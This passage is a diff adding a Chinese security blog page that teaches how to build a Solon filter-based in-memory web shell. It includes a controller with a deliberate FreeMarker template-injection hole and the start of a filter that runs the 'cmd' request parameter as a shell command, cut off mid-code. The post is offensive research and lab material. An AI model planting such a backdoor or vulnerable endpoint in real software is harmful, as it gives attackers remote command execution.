@@ -1,0 +1,742 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sp4rks3">
+  <meta name="keywords" content="博客">
+  
+    <meta name="description" content="前言去年8月就在星球看到ABU师傅发solon内存马了，直到现在才准备看一下。结果发现确实简单，真的属于是最适合年轻人的第一个内存马。并且我发现官网demo中有Freemarker依赖，正好可以写一个漏洞环境。 简介Solon是一个高性能的Java应用开发框架，它具有轻量级、易于使用、高性能和可扩展等特点。 Solon请求处理过程示意图如下所示，Web处理会经过四个路段：过滤器(Filter) -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solon 哥斯拉内存马(最适合年轻人的第一个内存马)">
+<meta property="og:url" content="https://sp4rks3.github.io/2025/04/21/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Sp4rks3&#39;s Blog">
+<meta property="og:description" content="前言去年8月就在星球看到ABU师傅发solon内存马了，直到现在才准备看一下。结果发现确实简单，真的属于是最适合年轻人的第一个内存马。并且我发现官网demo中有Freemarker依赖，正好可以写一个漏洞环境。 简介Solon是一个高性能的Java应用开发框架，它具有轻量级、易于使用、高性能和可扩展等特点。 Solon请求处理过程示意图如下所示，Web处理会经过四个路段：过滤器(Filter) -">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/9e9e9246d996491f80a83a38e9e7f575.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_16-21-066.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_15-00-44.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_15-04-41.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_16-21-04.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/image-20250421163428978.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/image-20250421163039755.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/image-20250421163636428.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/image-20250421163726807.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/04/image-20250421163759698.png">
+<meta property="article:published_time" content="2025-04-21T10:01:49.049Z">
+<meta property="article:modified_time" content="2025-04-21T13:54:32.481Z">
+<meta property="article:author" content="Sp4rks3">
+<meta property="article:tag" content="JAVA内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2025/04/9e9e9246d996491f80a83a38e9e7f575.png">
+  
+  
+  
+  <title>Solon 哥斯拉内存马(最适合年轻人的第一个内存马) - Sp4rks3&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sp4rks3.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sp4rks3&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Solon 哥斯拉内存马(最适合年轻人的第一个内存马)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-21 18:01" pubdate>
+          2025年4月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Solon 哥斯拉内存马(最适合年轻人的第一个内存马)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年8月就在星球看到ABU师傅发solon内存马了，直到现在才准备看一下。结果发现确实简单，真的属于是最适合年轻人的第一个内存马。并且我发现官网demo中有Freemarker依赖，正好可以写一个漏洞环境。</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Solon是一个<strong>高性能的Java应用开发框架</strong>，它具有轻量级、易于使用、高性能和可扩展等特点。</p>
+<p>Solon请求处理过程示意图如下所示，Web处理会经过四个路段：过滤器(Filter) -&gt; 路由拦截器(RouterInterceptor) -&gt; 处理器(Handler) -&gt; 拦截器(Interceptor)。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/9e9e9246d996491f80a83a38e9e7f575.png" srcset="/img/loading.gif" lazyload alt="9e9e9246d996491f80a83a38e9e7f575"></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用官网给出的项目模板搭建即可，<a target="_blank" rel="noopener" href="https://solon.noear.org/article/learn-quickstart">https://solon.noear.org/article/learn-quickstart</a>  。然后我们写一个有freemarker解析漏洞的controller，用来后面实例化我们的内存马。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> freemarker.cache.StringTemplateLoader;<br><span class="hljs-keyword">import</span> freemarker.template.Configuration;<br><span class="hljs-keyword">import</span> freemarker.template.Template;<br><span class="hljs-keyword">import</span> freemarker.template.TemplateException;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Param;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Configuration cfg;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StringTemplateLoader templateLoader;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DemoController</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.cfg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.VERSION_2_3_30);<br>        <span class="hljs-built_in">this</span>.templateLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTemplateLoader</span>();<br>        cfg.setTemplateLoader(templateLoader);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Mapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;Hello %s!&quot;</span>, name);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Mapping(&quot;/hello2&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">hello2</span><span class="hljs-params">(<span class="hljs-meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;hello2.ftl&quot;</span>).put(<span class="hljs-string">&quot;name&quot;</span>, name);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Mapping(&quot;/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">renderTemplate</span><span class="hljs-params">(<span class="hljs-meta">@Param</span> String template)</span> <span class="hljs-keyword">throws</span> TemplateException, IOException &#123;<br>        <span class="hljs-comment">// 检查模板是否为 null</span><br>        <span class="hljs-keyword">if</span> (template == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Template content cannot be null&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 将用户输入的模板存入 TemplateLoader</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;userTemplate&quot;</span>;<br>        templateLoader.putTemplate(templateName, template);<br><br>        <span class="hljs-comment">// 通过 TemplateLoader 获取模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">freemarkerTemplate</span> <span class="hljs-operator">=</span> cfg.getTemplate(templateName);<br><br>        Map&lt;String, Object&gt; dataModel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 解析</span><br>        freemarkerTemplate.process(dataModel, out);<br><br>        <span class="hljs-keyword">return</span> out.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>能正常访问就没问题了。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_16-21-066.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2025-04-21_16-21-066"></p>
+<h1 id="Filter内存马构造"><a href="#Filter内存马构造" class="headerlink" title="Filter内存马构造"></a>Filter内存马构造</h1><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>根据官网示例，随便写一个Filter，然后在&#x2F;hello路由下个断点。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><br><br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Component;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Context;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Filter;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.FilterChain;<br><br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(Context ctx, FilterChain chain)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;filter&quot;</span>);<br>        chain.doFilter(ctx);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，最先调用doFilter方法是在<code>org.noear.solon.core.ChainManager#doFilter</code>，其中，filterNodes中存储着我们自定义Filter的实例。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_15-00-44.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2025-04-21_15-00-44"></p>
+<p>然后我们可以发现filterNodes是一个集合实例，那肯定会有往集合添加元素的操作。通过源码，可以看到实际向该集合添加过滤器的就是<code>org.noear.solon.core.ChainManager#addFilter</code>和<code>org.noear.solon.core.ChainManager#addFilterIfAbsent</code>这两个方法，它们其实都差不多，区别在于addFilter可以添加重复的filter，addFilterIfAbsent只会添加一次。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_15-04-41.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2025-04-21_15-04-41"></p>
+<p>接下来就是找谁调用了addFilter。Ctrl+鼠标左键，跟进<code>org.noear.solon.core.route.RouterWrapper</code>，在初始化路由的时候，会对<code>ChainManager</code>进行初始化，通过调用addFilter方法来添加Filter，也就是说我们可以<strong>通过获取上下文中的_chainManager字段，来添加恶意的Filter</strong>。</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RouterWrapper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_ inherited__">HandlerSlots</span> &#123;<br>    <span class="hljs-keyword">private</span> Router _router;<br>    <span class="hljs-keyword">private</span> RouterHandler _routerHandler;<br>    <span class="hljs-keyword">private</span> ChainManager _chainManager;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> initRouter(SolonApp app) &#123;<br>        <span class="hljs-comment">//顺序不能换</span><br>        _chainManager = <span class="hljs-keyword">new</span> ChainManager(app);<br>        _router = <span class="hljs-keyword">new</span> RouterDefault();<br>        _routerHandler = <span class="hljs-keyword">new</span> RouterHandler(_router, _chainManager);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> filter(<span class="hljs-built_in">int</span> <span class="hljs-keyword">index</span>, Filter filter) &#123;<br>        _chainManager.addFilter(filter, <span class="hljs-keyword">index</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在我们自己写的Filter打个断点，尝试使用java-object-searcher来搜索获取到<code>_chainManager</code>字段的链。(我用c0ny1师傅的不行，用的7rovu师傅的修复版<a target="_blank" rel="noopener" href="https://github.com/7rovu/java-object-searcher">https://github.com/7rovu/java-object-searcher</a>)</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/Snipaste_2025-04-21_16-21-04.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2025-04-21_16-21-04"></p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">// 搜索_chainManager</span><br><span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">Keyword</span>&gt; keys = <span class="hljs-literal">new</span> ArrayList&lt;&gt;();<br>keys.add(<span class="hljs-literal">new</span> <span class="hljs-built_in">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;_chainManager&quot;</span>).build());<br><span class="hljs-comment">// 新建一个广度优先搜索Thread.currentThread()的搜索器</span><br>SearchRequstByBFS searcher = <span class="hljs-literal">new</span> SearchRequstByBFS(<span class="hljs-keyword">Thread</span>.currentThread());<br><span class="hljs-comment">// 打开调试模式, 会生成log日志</span><br>searcher.setIs_debug(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 挖掘深度为20</span><br>searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br><span class="hljs-comment">// 设置报告保存位置</span><br>searcher.setReport_save_path(<span class="hljs-string">&quot;/tmp&quot;</span>);<br>searcher.searchObject();<br></code></pre></td></tr></table></figure>
+
+<p>在结果中选择一条合适的链就行。</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust">TargetObject = &#123;java.lang.Thread&#125; <br>  --<span class="hljs-punctuation">-&gt;</span> threadLocals = &#123;java.lang.ThreadLocal$ThreadLocalMap&#125; <br>   --<span class="hljs-punctuation">-&gt;</span> table = &#123;class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;&#125; <br>    --<span class="hljs-punctuation">-&gt;</span> [<span class="hljs-number">6</span>] = &#123;java.lang.ThreadLocal$ThreadLocalMap$Entry&#125; <br>     --<span class="hljs-punctuation">-&gt;</span> value = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContext&#125; <br>      --<span class="hljs-punctuation">-&gt;</span> _request = &#123;org.smartboot.http.server.<span class="hljs-keyword">impl</span>.HttpRequestImpl&#125; <br>       --<span class="hljs-punctuation">-&gt;</span> request = &#123;org.smartboot.http.server.<span class="hljs-keyword">impl</span>.Request&#125; <br>        --<span class="hljs-punctuation">-&gt;</span> serverHandler = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContextHandler&#125; <br>         --<span class="hljs-punctuation">-&gt;</span> handler = &#123;org.noear.solon.boot.smarthttp.integration.SmHttpPlugin$$Lambda$<span class="hljs-number">99</span>/<span class="hljs-number">645482568</span>&#125; <br>          --<span class="hljs-punctuation">-&gt;</span> arg$<span class="hljs-number">1</span> = &#123;org.noear.solon.SolonApp&#125; <br>            --<span class="hljs-punctuation">-&gt;</span> _chainManager = &#123;org.noear.solon.core.ChainManager&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于获取请求上下文，可以参考官方文档中的<a target="_blank" rel="noopener" href="https://solon.noear.org/article/216">认识请求上下文</a>，利用Context ctx &#x3D; Context.current();来直接获取当前上下文。</p>
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><br><span class="hljs-keyword">import</span> org.noear.solon.core.ChainManager;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Context;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Filter;<br><br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterMemoryShellController</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">FilterMemoryShellController</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            injectFilter();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">injectFilter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">evilFilter</span> <span class="hljs-operator">=</span> (ctx, chain) -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (ctx.param(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        isLinux = <span class="hljs-literal">false</span>;<br>                    &#125;<br><br>                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, ctx.param(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, ctx.param(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span 